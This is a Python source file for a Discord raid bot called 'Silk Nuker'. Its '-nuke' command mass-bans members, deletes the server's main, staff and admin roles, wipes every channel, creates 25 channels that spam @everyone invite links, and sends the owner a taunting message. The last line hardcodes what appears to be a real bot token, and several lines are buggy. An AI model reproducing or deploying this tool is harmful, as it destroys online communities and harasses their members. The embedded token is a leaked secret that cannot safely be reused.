#encoding: utf-8
import time
import discord
from colorama import Fore
from discord.ext import commands, tasks

client = commands.Bot(command_prefix="-", intents=discord.Intents.all())

print(f'''
███████╗██╗██╗     ██╗  ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
██╔════╝██║██║     ██║ ██╔╝    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
███████╗██║██║     █████╔╝     ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
╚════██║██║██║     ██╔═██╗     ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
███████║██║███████╗██║  ██╗    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
╚══════╝╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
''')
main_name = input("enter the servers main role name: ")
staff_name = input("enter the servers staff role name: ")
admin_name = input("enter the servers admin role name: ")

@client.event
async def on_ready():
        await client.change_presence(activity=discord.Streaming(name="Prefix '-'", url='https://discord.gg/GkNbxzEKU6'))

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.channel.send('Thats not a real command!')
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.channel.send('You missed an argument!')
    else:
        raise error

@client.command()
async def nuke(ctx):
    async for member in ctx.guild.fetch_members():
        print("Starting")
        try:
            await member.ban(reason=f'Nuked by {ctx.author} | blame ovhmix and your team leaders for not defending members')
            print("Members banned succesfully!")
        except:
            pass

        try:
            role = discord.utils.get(ctx.message.guild.roles, name=main_name)
            if role:
                await role.delete()
        except discord.Forbidden:
                 print('Missing permissions to delete this role!')
    try:
        role = discord.utils.get(ctx.message.guild.roles, name=staff_name)
        if role:
            await role.delete()
    except discord.Forbidden:
        await print('Missing permissions to delete this role!')
    try:
        role = discord.utils.get(ctx.message.guild.roles, name=admin_name)
        if role:
            await role.delete()
    except discord.Forbidden:
        await print('Missing permissions to delete this role!')
    try:     
           for channel in ctx.guild.channels:
            await channel.delete()
    except discord.Forbidden:
        await ctx.author.send('Missing permissions to delete this channel!')
    try:
        for _ in range(25):
                await ctx.guild.create_text_channel('discord.gg/test')
                for channel in ctx.guild.text_channels:
                    await channel.send("@everyone join discord.gg/yourserver")
    except:
        pass
    try:
            await ctx.guild.owner.send(f'Nuked by {ctx.author} | blame ovhmix and your team leaders for not defending members')
    
    
            print(f"25 new channels were created with our invite link (upgrade to be able to edit these messages)!")
            time.sleep(2)            
            print(f"messaged owner of server and all members banned: Nuked by {ctx.author} | blame ovhmix and your team leaders for not defending members (upgrade to edit)!")
            time.sleep(2)
            print(f'Succesfully Nuked {ctx.guild.name}')
            with open("succesfull.txt", "a") as file:
                print(f"succesfully nuked {ctx.guild.name}\nat {time} ")  
    except:

        pass

client.run('MTI4ODEzNzY0MzAyODI1MDY0NQ.GMIKh7.cbFcOFIy4Ib9cWemzv9be8JwJ6pnhtRn3ycwho')
